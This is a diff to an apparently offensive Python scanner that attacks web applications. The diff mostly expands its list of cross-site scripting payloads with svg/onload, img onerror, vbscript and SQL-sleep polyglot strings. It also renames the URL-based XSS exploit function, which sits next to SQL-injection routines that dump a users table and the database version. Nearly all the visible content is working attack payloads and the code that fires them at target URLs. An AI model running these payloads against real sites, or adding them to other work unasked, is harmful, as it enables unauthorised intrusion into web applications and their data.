@@ -12,9 +12,26 @@ proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 init(autoreset=True)
 
 xss_payloads = [
-    "<script>alert('XSS')</script>",
+    "<script>alert('Hacked')</script>",
+    """><svg/onload=prompt(1)>"",
+    "<svg/onload=prompt(1)",
+    "<script>prompt.call`${1}`</script>",
+    "--!><svg/onload=prompt(1)",
+    "//prompt.ml%2f@⒕₨",
+    "vbscript:prompt(1)#{"action":1}",
+    """"><img src=1 onerror=alert(1)>""",
+    "p'rompt(1)",
+    "<svg><script>prompt&#40;1)</script>",
+    '"><script>alert(document.domain)</script>',
+    '" autofocus onfocus="alert(document.domain)',
     "javascript:alert('XSS')",
     "';alert('XSS');//",
+    "'--><svg onload=alert()>",
+    " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
+    """ 1/*' or 1 or'" or 1 or"*//*" """,
+    """“ onclick=alert(1)//<button value=Click_Me ‘ onclick=alert(1)//> */ alert(1); /*""",
+    """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
+    """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
     "<img src=x onerror=alert('XSS')>",
     "<svg/onload=alert('XSS')>",
     "'<script>alert('XSS')</script>'",
@@ -152,7 +169,7 @@ def get_forms_and_inputs(response, max_attempts=3):
     }
     return result
 
-def exploit_xss(url):
+def exploit_xss_url(url):
     for payload in xss_payloads:
         target_url = f"{url}?input={payload}"
         try:
@@ -174,7 +191,7 @@ def exploit_xss(url):
                 return True
 
             if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
-                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}"+ Style.RESET_ALL)
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                 return True
 
         except SSLError as e:
@@ -557,7 +574,7 @@ if __name__ == "__main__":
             exploit_sqli_users_table(test_url)
             exploit_database_version(test_url)
             
-            exploit_xss(test_url)
+            exploit_xss_url(test_url)
             submit_xss_payloads_to_forms(test_url)
             
     else:
